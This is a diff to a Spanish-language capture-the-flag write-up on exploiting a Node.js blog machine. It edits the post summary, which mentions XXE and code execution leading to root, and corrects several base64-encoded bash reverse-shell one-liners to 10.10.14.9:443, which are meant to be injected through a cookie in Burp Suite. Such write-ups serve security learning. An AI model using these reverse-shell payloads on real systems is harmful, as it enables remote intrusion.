@@ -4,7 +4,7 @@ date: '2022-02-01'
 tags: ["#Import 2022-12-20 21:06"]
 draft: true
 authors: ['default']
-summary: 'Reto CTF que consiste en explorar una máquina con el objetivo de obtener acceso de root. El escaneo de puertos revela un servicio SSH en el puerto 22 y un servidor web Node.js en el puerto 5000. Se intenta realizar inyección SQL sin éxito, pero se descubre una vulnerabilidad de XML External entity en el servidor web. Al aprovechar esta vulnerabilidad, se logra ejecutar código y obtener acceso de usuario. Posteriormente, se obtienen las contraseñas de los usuarios y se accede como root, obteniendo las banderas del usuario y del sistema.'
+summary: 'Resumen: Reto CTF que consiste en encontrar vulnerabilidades en una máquina CTF de Capture The Flag. Se exploran puertos, se intentan inyecciones SQL y se descubre una vulnerabilidad de XML External Entity que permite ejecutar código. Se logra obtener acceso de root y se obtienen las flags.'
 images: ["/static/images/uploads/ctf-nodeblog-writeup/Screenshot_1.webp", "/static/images/uploads/ctf-nodeblog-writeup/Screenshot_2.webp", "/static/images/uploads/ctf-nodeblog-writeup/Screenshot_4.webp", "/static/images/uploads/ctf-nodeblog-writeup/Screenshot_5.webp"]
 ---
 
@@ -143,13 +143,13 @@ con burpsuite hago pruebas y veo que a veces ejecuta codigo y a veces no. Como h
 
 
 ```
-❯ echo -n "bash -i & /dev/tcp/10.10.14.9/443 0&1" | base64
+❯ echo -n "bash -i >& /dev/tcp/10.10.14.9/443 0>&1" | base64
 YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45LzQ0MyAwPiYx
-❯ echo -n "bash -i  & /dev/tcp/10.10.14.9/443 0&1" | base64
+❯ echo -n "bash -i  >& /dev/tcp/10.10.14.9/443 0>&1" | base64
 YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOS80NDMgMD4mMQ==
-❯ echo -n "bash -i  & /dev/tcp/10.10.14.9/443  0&1" | base64
+❯ echo -n "bash -i  >& /dev/tcp/10.10.14.9/443  0>&1" | base64
 YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuOS80NDMgIDA+JjE=
-❯ echo -n "bash -i  &  /dev/tcp/10.10.14.9/443  0&1" | base64
+❯ echo -n "bash -i  &  /dev/tcp/10.10.14.9/443  0>&1" | base64
 YmFzaCAtaSAgPiYgIC9kZXYvdGNwLzEwLjEwLjE0LjkvNDQzICAwPiYx
 
 # Copio el siguiente código en la cookie de burpsuite
